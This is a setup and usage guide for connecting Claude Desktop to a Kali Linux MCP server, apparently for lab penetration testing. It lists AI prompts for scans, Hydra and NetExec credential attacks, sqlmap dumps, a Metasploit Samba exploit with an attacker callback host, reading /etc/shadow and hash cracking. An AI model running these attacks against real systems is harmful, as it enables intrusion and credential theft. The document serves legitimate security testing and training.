# Kali MCP

## Installation

### 1) Install Kali MCP

    sudo apt install mcp-kali-server

### 2) Start the Kali MCP/API Server

    kali-server mcp

Review client configuration

Link:

    https://github.com/Wh0am123/MCP-Kali-Server

### 3) Add Claude Desktop repository key and install it

Import the repository signing key so APT can verify packages

    curl -fsSL https://pkg.claude-desktop-debian.dev/KEY.gpg | sudo gpg --dearmor -o /usr/share/keyrings/claude-desktop.gpg

Register the repository and refresh APT

    echo "deb [signed=/usr/share/keyrings/claude-desktop.gpg arch=amd64,arm64] https://pkg.claude-desktop-debian.dev stable main" | sudo tee /etc/apt/sources.list.d/claude-desktop.list

Install Claude Desktop

    sudo apt install claude-desktop

### 4) Integrate MCP

In Claude Desktop, go to:

    Settings -> Developer tab -> Local MCP Servers -> Edit Config to open the JSON file that defines them.

Claude configuration file

    ~/.config/Claude/claude_desktop_config.json

Use the template from the repository, then verify the integration.

    connect with kali tool mcp

## Execution and Usage

### 1) Scan with Nmap

Example:

    execute_command nmap_scan against IP in fast mode, performing service version detection and executing default NSE scripts.

### 2) Web Directory enumeration with Gobuster

    execute_command gobuster_scan http://IP/dvwa/

Cross validate with dirb

    execute dirb_scan against http://IP/dvwa/ and display only the directories or files that return an HTTP 200 OK response

### 3) SMB Enumeration with enum4linux

    execute_command enum4linux_scan IP

### 4) SSH credential attack with Hydra

    execute_command hydra_attack to test SSH logins on IP using the usernames from users.txt and passwords from passwords.txt, which are stored on the Kali system.

### 5) SQL Injection with sqlmap

    execute_command sqlmap_scan on http://IP/whatever/

Proceed with the dump if an SQL injection is found

    dump tables from the DATABASE_NAME database or extract user credentials

### 6) Metasploit (Port Scanning)

    execute_command metasploit_scan port scan on IP

### 7) Metasploit (Use an exploit)

    use Samba usermap_script (CVE-2007-2447) on port 445 lhost=ATTACKER_IP

### 8) Metasploit (Sessions)

    Sessions

### 9) Crack hashes with John The Ripper

Dump credentials (example)

    dump /etc/shadow

Crack with John

    execute_command john_crack on hashes using rockyou.txt file

### 10) WordPress target

    execute_command wp_scan http://IP/wordpress/

Exploit a vulnerable plugin

    exploit PLUGIN_NAME

### 11) Nikto

    execute_command nikto_scan IP

### 12) Health Check

    health_check

### 13) All available commands

    help

### 14) Use Netexec to test via SMB

    execute_command nxc to test smb authentication on IP with the usernames listed in users.txt and the passwords listed in passwords.txt both stored on the Kali system.

